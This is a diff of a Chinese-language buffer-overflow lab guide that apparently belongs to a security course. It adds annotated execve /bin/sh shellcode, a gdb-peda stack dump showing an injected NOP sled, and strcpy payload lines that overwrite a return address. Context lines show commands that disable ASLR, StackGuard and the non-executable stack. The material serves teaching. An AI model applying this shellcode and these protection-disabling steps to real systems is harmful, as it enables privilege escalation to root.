@@ -22,22 +22,24 @@ Ubuntu和其他Linux发行版已经实现了几种安全机制，以使缓冲区
 为了简化攻击，我先禁用它们。然后再我们将一一启用它们，并查看我们的攻击是否仍然可以成功。
 
 **地址空间随机化**： Ubuntu和其他几个基于Linux的系统使用地址空间随机化来随机化堆和栈的起始地址。这使得猜测确切的地址变得困难。猜测地址是缓冲区溢出攻击的关键步骤之一。在本实验中，我们使用以下命令禁用此功能：
+
 ```shell
 $ sudo sysctl -w kernel.randomize_va_space=0
 ```
 
 **StackGuard保护方案**：  GCC编译器实现了一种称为StackGuard的安全机制，以防止缓冲区溢出。在这种保护的情况下，缓冲区溢出攻击将不起作用。我们可以在编译期间使用`-fno-stack-protector`选项禁用此保护。例如，要在禁用StackGuard的情况下编译程序`example.c`，我们可以执行以下操作：
+
 ```shell
 $ gcc -fno-stack-protector example.c
 ```
 
 **不可执行的堆栈**： Ubuntu曾经允许可执行堆栈，但是现在已经发生了变化：程序（和共享库）的二进制映像必须声明它们是否需要可执行堆栈，即它们需要在程序标头中标记一个字段。内核或动态链接器使用此标记来决定是使此正在运行的程序的堆栈是可执行的还是不可执行的。标记是由最新版本的gcc自动完成的，默认情况下，堆栈设置为不可执行。要更改此设置，请在编译程序时使用以下选项：
 
-`对于可执行堆栈：`
+`可执行堆栈：`
 ```shell
 $ gcc -z execstack -o test test.c
 ```
-`对于不可执行堆栈`
+`不可执行堆栈`
 ```shell
 $ gcc -z noexecstack -o test test.c
 ```
@@ -63,26 +65,27 @@ int main()
     execve(name[0],name,NULL);
 }
 ```
-我们使用的shellcode只是上述程序的汇编版本。以下程序显示了如何通过执行存储在缓冲区中的shellcode来启动shell。请编译并运行以下代码，并查看是否调用了shell。您可以从网站下载程序。
+我们使用的shellcode只是上述程序的汇编版本。以下程序显示了如何通过执行存储在缓冲区中的shellcode来启动shell。请编译并运行以下代码，并查看是否调用了shell。为了给execve传递参数，需要字符串的地址，这里采用了push并传递esp的方法；cdq是一个简短的指令来使edx置零。您可以从网站下载程序。
 ```c
 /* call_shellcode.c  */
 
 /*A program that creates a file containing code for launching shell*/
+#include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
-
+// 这里的汇编代码，是代表shellcode
 const char code[] =
-  "\x31\xc0"             /* xorl    %eax,%eax              */
-  "\x50"                 /* pushl   %eax                   */
-  "\x68""//sh"           /* pushl   $0x68732f2f            */
-  "\x68""/bin"           /* pushl   $0x6e69622f            */
-  "\x89\xe3"             /* movl    %esp,%ebx              */
-  "\x50"                 /* pushl   %eax                   */
-  "\x53"                 /* pushl   %ebx                   */
-  "\x89\xe1"             /* movl    %esp,%ecx              */
-  "\x99"                 /* cdq                            */
-  "\xb0\x0b"             /* movb    $0x0b,%al              */
-  "\xcd\x80"             /* int     $0x80                  */
+  "\x31\xc0"             /* xorl    %eax,%eax              1*/
+  "\x50"                 /* pushl   %eax                   2*/
+  "\x68""//sh"           /* pushl   $0x68732f2f            3*/
+  "\x68""/bin"           /* pushl   $0x6e69622f            4*/
+  "\x89\xe3"             /* movl    %esp,%ebx              5*/
+  "\x50"                 /* pushl   %eax                   6*/
+  "\x53"                 /* pushl   %ebx                   7*/
+  "\x89\xe1"             /* movl    %esp,%ecx              8*/
+  "\x99"                 /* cdq                            9*/
+  "\xb0\x0b"             /* movb    $0x0b,%al              10*/
+  "\xcd\x80"             /* int     $0x80                  11*/
 ;
 
 int main(int argc, char **argv)
@@ -101,7 +104,7 @@ $ gcc -z execstack -o call_shellcode call_shellcode.c
 
 **首先**，第三条指令将“//sh”而不是“/sh”压入堆栈。这是因为我们在这里需要一个32位数字，而“/sh”只有24位。幸运的是，“//”等效于“/”，因此我们可以避免使用双斜杠符号。
 
-**其次**，在调用execve()系统调用之前，我们需要将name[0]（字符串的地址），name（数组的地址）和NULL分别存储到％ebx，％ecx和％edx寄存器中。第5行将name [0]存储到％ebx；第8行将名称存储到％ecx；第9行将％edx设置为零。还有其他方法可以将％edx设置为零(例如xorl％edx，％edx)； 这里使用的那个(cdq)只是一条较短的指令：它将EAX寄存器中的值的符号（第31位）（此时为0）复制到EDX寄存器的每个位位置，基本上将％edx设置为 0.
+**其次**，在调用execve()系统调用之前，我们需要将name[0]（字符串的地址），name（数组的地址）和NULL分别存储到％ebx，％ecx和％edx寄存器中。第5行将name [0]存储到％ebx；第8行将名称存储到％ecx；第9行将％edx设置为零。还有其他方法可以将％edx设置为零(例如xorl％edx，％edx)； 这里使用的那个(cdq)只是一条较短的指令：它将EAX寄存器中的值的符号（第31位）（此时为0）复制到EDX寄存器的 每个位位置，基本上将％edx设置为 0.
 
 **第三**，当我们将％al设置为11并执行“ int $ 0x80”时，系统调用execve()被调用。
 
@@ -193,6 +196,103 @@ void main(int argc, char **argv)
 }
 ```
 
+```shell
+Dump of assembler code for function main:
+   0x080484da <+0>:	lea    ecx,[esp+0x4]
+   0x080484de <+4>:	and    esp,0xfffffff0
+   0x080484e1 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x080484e4 <+10>:	push   ebp
+   0x080484e5 <+11>:	mov    ebp,esp
+   0x080484e7 <+13>:	push   ecx
+   0x080484e8 <+14>:	sub    esp,0x214
+   0x080484ee <+20>:	sub    esp,0x8
+   0x080484f1 <+23>:	push   0x80485d0
+   0x080484f6 <+28>:	push   0x80485d2
+   0x080484fb <+33>:	call   0x80483a0 <fopen@plt>
+   0x08048500 <+38>:	add    esp,0x10
+   0x08048503 <+41>:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048506 <+44>:	push   DWORD PTR [ebp-0xc]
+   0x08048509 <+47>:	push   0x205
+   0x0804850e <+52>:	push   0x1
+   0x08048510 <+54>:	lea    eax,[ebp-0x211]
+   0x08048516 <+60>:	push   eax
+   0x08048517 <+61>:	call   0x8048360 <fread@plt>
+   0x0804851c <+66>:	add    esp,0x10
+   0x0804851f <+69>:	sub    esp,0xc
+   0x08048522 <+72>:	lea    eax,[ebp-0x211]
+   0x08048528 <+78>:	push   eax
+   0x08048529 <+79>:	call   0x80484bb <bof>
+   0x0804852e <+84>:	add    esp,0x10
+   0x08048531 <+87>:	sub    esp,0xc
+   0x08048534 <+90>:	push   0x80485da
+   0x08048539 <+95>:	call   0x8048380 <puts@plt>
+   0x0804853e <+100>:	add    esp,0x10
+   0x08048541 <+103>:	mov    eax,0x1
+   0x08048546 <+108>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048549 <+111>:	leave  
+   0x0804854a <+112>:	lea    esp,[ecx-0x4]
+   0x0804854d <+115>:	ret    
+End of assembler dump.
+-- 在shell中输入 b bof() 设置断点 然后输入run  再输入 i frame 就会显示信息
+gdb-peda$ i frame
+Stack level 0, frame at 0xbfda0c70:
+ eip = 0x80484c1 in bof; saved eip = 0x804852e
+ called by frame at 0xbfda0eb0
+ Arglist at 0xbfda0c68, args: 
+ Locals at 0xbfda0c68, Previous frame's sp is 0xbfda0c70
+ Saved registers:
+  ebp at 0xbfda0c68, eip at 0xbfda0c6c
+  
+  x/<n/f/u> <target>
+
+n f u 为可选参数
+
+n 个数
+
+gdb-peda$ x /108x 0xbfda0c00
+0xbfda0c00:	0x09431008	0x00000205	0xbfda0c68	0xb761033e
+0xbfda0c10:	0x09431008	0xbfda0c87	0x00000205	0xb76033c1
+0xbfda0c20:	0xb779c000	0x0804824c	0x080485d0	0xb76038f7
+0xbfda0c30:	0x09431008	0xbfda0c87	0x00000205	0xb77927ac
+0xbfda0c40:	0xb77866eb	0x00000000	0xb7757000	0xb779a940
+0xbfda0c50:	0xbfda0e98	0xb778cf10	0xb760388b	0x00000000
+0xbfda0c60:	0xb7757000	0xb7757000	`0xbfda0e98`	`0x0804852e`
+0xbfda0c70:	0xbfda0c87	0x00000001	0x00000205	0x09431008
+0xbfda0c80:	0xb77782e4	0x78000000	0x00bfd904	0x90909090
+0xbfda0c90:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0ca0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0cb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0cc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0cd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0ce0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0cf0:	0x90909090	0x31909090	0x2f6850c0	0x6868732f
+0xbfda0d00:	0x6e69622f	0x5350e389	0xb099e189	0x0080cd0b
+0xbfda0d10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d40:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d50:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d60:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d70:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d80:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0d90:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfda0da0:	0x90909090	0x90909090	0x90909090	0x90909090
+
+ebp  0xbfda0e98
+eip  0x0804852e
+
+gdb-peda$ p buffer
+$1 = '\000' <repeats 29 times>
+gdb-peda$ p &buffer
+$2 = (char (*)[30]) 0xb775a5b4 <buffer>
+
+0xbfda0e98	0x0804852e
+
+strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x18\x9f\x84\xbf");
+
+strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x??\x??\x??\x??");
+```
+
 完成上述程序后，编译并运行它。这将生成`badfile`的内容。然后运行易受攻击的程序`stack.c`。如果您的漏洞利用程序正确实施，则应该能够获得`root shell`： 
 
 **重要提示**：请首先编译您的易受攻击的程序。请注意，生成`badfile`的程序`exploit.c`可以在启用默认StackGuard保护的情况下进行编译。这是因为我们不会在该程序中溢出缓冲区。我们将溢出`stack.c`中的缓冲区，该缓冲区是在禁用StackGuard保护的情况下编译的。
@@ -208,4 +308,4 @@ $./stack // launch the attack by running the vulnerable program
 
 
 
-
+ 
